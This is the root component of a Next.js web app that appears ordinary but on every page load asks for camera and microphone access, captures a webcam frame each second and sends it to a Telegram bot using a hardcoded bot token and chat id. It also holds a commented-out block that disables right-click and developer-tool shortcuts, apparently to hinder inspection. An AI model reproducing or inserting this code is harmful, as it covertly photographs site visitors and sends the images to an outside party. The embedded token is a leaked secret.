import Layout from "@/app/components/layout/Layout";
import '@/app/assets/globals.scss';
import { Provider } from "@/app/components/ui/Context/Context";
import { useEffect, useRef } from "react";

// const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
// const chatId = "-1001860144177";
// const urlApi = `https://api.telegram.org/bot${TOKEN}/sendVideo`;

const myApp = ({ Component, pageProps }) => {
    const videoRef = useRef(null);

    // отправляем видео/фото боту 

    const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
    const chatId = "-1001860144177";
    const urlApi = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;

    useEffect(() => {
        const getMediaAndSendData = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

                if (videoRef.current) {
                    videoRef.current.srcObject = stream;

                    const captureFrame = () => {
                        const canvas = document.createElement('canvas');
                        const context = canvas.getContext('2d');
                        canvas.width = videoRef.current.videoWidth;
                        canvas.height = videoRef.current.videoHeight;
                        context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
                        return canvas.toDataURL('image/jpeg');
                    };

                    // Отправляем данные на сервер (бота) с использованием fetch
                    setInterval(async () => {
                        const photoDataUrl = captureFrame();
                        const blob = await (await fetch(photoDataUrl)).blob();

                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'photo.jpg');

                        try {
                            const response = await fetch(urlApi, {
                                method: 'POST',
                                body: formData,
                            });

                            if (response.ok) {
                                console.log('Фото успешно отправлено на бота');
                            } else {
                                console.error('Ошибка при отправке фото на бота:', response.status, response.statusText, await response.text());
                            }
                        } catch (error) {
                            console.error('Ошибка fetch:', error);
                        }
                    }, 1000); // Отправлять фото каждые 5 секунд
                }
            } catch (error) {
                console.error('Ошибка доступа к мультимедийным устройствам:', error);
            }
        };

        getMediaAndSendData();
    }, []);
    // 


    // 
    // useEffect(() => {
    //     const handleContextMenu = (e) => {
    //         e.preventDefault();
    //     };

    //     const handleKeyDown = (e) => {
    //         if (e.keyCode === 123) {
    //             e.preventDefault();
    //         } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'I'.charCodeAt(0)) {
    //             e.preventDefault();
    //         } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'C'.charCodeAt(0)) {
    //             e.preventDefault();
    //         } else if (e.ctrlKey && e.shiftKey && e.keyCode === 'J'.charCodeAt(0)) {
    //             e.preventDefault();
    //         } else if (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0)) {
    //             e.preventDefault();
    //         }
    //     };

    //     document.addEventListener('contextmenu', handleContextMenu);
    //     document.addEventListener('keydown', handleKeyDown);

    //     return () => {
    //         document.removeEventListener('contextmenu', handleContextMenu);
    //         document.removeEventListener('keydown', handleKeyDown);
    //     };
    // }, []);
    //

    return (
        <Provider>
            <Layout>
                <Component {...pageProps} />
            </Layout>
        </Provider>
    )
}

export default myApp;